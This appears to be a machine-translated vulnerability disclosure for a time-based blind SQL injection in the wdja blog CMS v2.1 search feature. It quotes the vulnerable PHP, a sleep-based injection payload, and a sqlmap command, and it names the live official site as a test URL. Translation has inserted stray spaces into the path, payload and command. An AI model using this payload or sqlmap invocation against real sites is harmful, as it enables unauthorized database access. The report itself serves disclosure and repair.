Vulnerability Title: wdja blog content management system 2.1 foreground search SQL injection vulnerability

Vulnerability address: https://github.com/shadoweb/wdja 、 http://www.wdja.net/

Affected version: v2.1

Discovery time: October 4, 2021

Found by: Xinghe

Analysis report:

Vulnerability Code: ` / search / common / incfiles / module_ Config. Inc.php `, ` tshkeyword 'parameters are not filtered, resulting in the database system being able to execute SQL statements

```php
$tshkeyword = ii_get_safecode($_GET['keyword']);
foreach ($tshkeywords as $key => $val)
    {
      foreach ($tnfields as $tnfield)
      {
        if ($tnfield == 'topic') $tsqlstr .= " and " . ii_cfnames($tfpre, $tnfield) . " like '%" . $val . "%'";
        else $tsqlstr .= " or " . ii_cfnames($tfpre, $tnfield) . " like '%" . $val . "%'";
      }
    }
```

URl：` http://127.0.0.1/search/?type=list&keyword=88 `Or the official website` https://www.wdja.net/search/?type=list&keyword=88 `

Parameters: ` keyword`

Type: ` time based blind`

Input parameters such as ` 88`

![image-20211006161926590](https://xingheimg.oss-cn-guangzhou.aliyuncs.com/img/image-20211006161926590.png)

Use burp to capture packets and payload to test: ` FDFS "+ and (select * from (select + sleep (3)) a / * * / Union / * * / select + 1) = `. It is found that the system returns data after a delay of 3 seconds

![image-20211004163029697](https://xingheimg.oss-cn-guangzhou.aliyuncs.com/img/image-20211004163029697.png)

When the time is changed to 8 seconds, the system also delays 8 seconds before returning data

![image-20211004163201379](https://xingheimg.oss-cn-guangzhou.aliyuncs.com/img/image-20211004163201379.png)

Test with sqlmap: ` sqlmap - R a.txt -- random agent -- level 5 -- risk 3 - V -- batch -- DBMS = MySQL -- time sec 3 -- technique t`

![image-20211004163318514](https://xingheimg.oss-cn-guangzhou.aliyuncs.com/img/image-20211004163318514.png)

Repair plan:

Strictly filter parameters, remove or, and, select, sleep and other database keywords, or use precompiled
